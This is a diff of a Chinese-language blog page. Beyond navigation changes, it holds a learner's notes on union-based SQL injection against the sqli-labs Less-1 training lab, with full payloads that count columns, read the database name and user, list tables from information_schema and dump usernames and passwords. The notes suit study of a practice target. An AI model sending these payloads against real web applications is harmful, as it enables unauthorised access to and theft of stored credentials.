@@ -21,6 +21,13 @@
            
             <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
                             <li><a href="/">首页</a>
                                 <span class="nav-style top"></span>
                                 <span class="nav-style bottom"></span>
@@ -29,20 +36,6 @@
                                 </li>
                     
                             <li><a href="/archives">归档</a>
-                                <span class="nav-style top"></span>
-                                <span class="nav-style bottom"></span>
-                                <span class="nav-style left"></span>
-                                <span class="nav-style right"></span>
-                                </li>
-                    
-                            <li><a href="/tags">标签</a>
-                                <span class="nav-style top"></span>
-                                <span class="nav-style bottom"></span>
-                                <span class="nav-style left"></span>
-                                <span class="nav-style right"></span>
-                                </li>
-                    
-                            <li><a href="/post/about">关于</a>
                                 <span class="nav-style top"></span>
                                 <span class="nav-style bottom"></span>
                                 <span class="nav-style left"></span>
@@ -74,14 +67,14 @@
 <p>*/</p>
 <p>order by 4</p>
 <p>示例（华理ctf靶场）：</p>
-<p>http://39.105.84.217:40004/Less-1/?id='order by 4 --+</p>
+<p>http://IP/Less-1/?id='order by 4 --+</p>
 <p>得到报错Unknown column '4' in 'order clause'</p>
 <p>通过此报错，就可以确定mysql中，这个数据库的字段为3，所以，我们在使用mysql 进行联合查询时（union select），输入1,2,3进行攻击</p>
 <p>union select 1,2,3</p>
 <p><em><strong>如何查询数据？</strong></em></p>
 <p>第一步：获取当前数据库名称及当前数据库用户</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,2,3 --+</p>
+<p>http://IP/Less-1/?id='union select 1,2,3 --+</p>
 <p>显示：</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:2<br>
@@ -90,7 +83,7 @@ Your Password:3</p>
 <p>使用函数：database()，user()</p>
 <p>获取到，当前数据库名称为security，当前数据库操作用户为root</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,database(),user() --+</p>
+<p>http://IP/Less-1/?id='union select 1,database(),user() --+</p>
 <p>显示：</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:security<br>
@@ -107,14 +100,14 @@ Your Password:root@localhost</p>
 <p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'</p>
 <p>group_concat将查询到的数据都列出来</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/</p>
+<p>http://IP/Less-1/</p>
 <p>?id='union select 1,table_name,</p>
 <p>3 from information_schema.tables where table_schema='security' --+</p>
 <p>条件：where table_schema='security'</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:emails<br>
 Your Password:3（这里只输出了一个表名）</p>
-<p>http://39.105.84.217:40004/Less-1/</p>
+<p>http://IP/Less-1/</p>
 <p>?id='union select 1,group_concat(table_name),</p>
 <p>3 from information_schema.tables where table_schema='security' --+</p>
 <p>Welcome  Dhakkan<br>
@@ -122,11 +115,11 @@ Your Login name:emails,referers,uagents,users<br>
 Your Password:3</p>
 <p>emmm这里应该还是sql语法知识欠缺</p>
 <p>所以闹了一个笑话：</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,table_name(),table_schema() --+</p>
+<p>http://IP/Less-1/?id='union select 1,table_name(),table_schema() --+</p>
 <p>尝试跟刚刚一样，直接让他输出出来,但是报错了</p>
 <p>原因是table_name是表名，不是一个函数</p>
 <p>换了一下，发现还是报错...</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,table_name,table_schema() --+</p>
+<p>http://IP/Less-1/?id='union select 1,table_name,table_schema() --+</p>
 <p>Welcome  Dhakkan<br>
 Unknown column 'table_name' in 'field list'</p>
 <p>(“字段列表”中的“表名”列未知)</p>
@@ -145,7 +138,7 @@ Your Password:3</p>
 <p>第四步：获取数据</p>
 <p>union select 1,group_concat(username),group_concat(password) from users</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,group_concat(username),group_concat(password) from users--+</p>
+<p>http://IP/Less-1/?id='union select 1,group_concat(username),group_concat(password) from users--+</p>
 <p>显示：</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>
@@ -156,7 +149,7 @@ Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,adm
                                     <div class="mdui-divider mdui-m-b-2"></div>
                                     <div class="mdui-row-xs-2 post-fenye">
                                        
-                                        <div class="mdui-col"> </div>
+                                        <div class="mdui-col"> <div class="mdui-text-left"><a href="https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-02/">SQL注入笔记02</a></div></div>
                                         
 
                                         
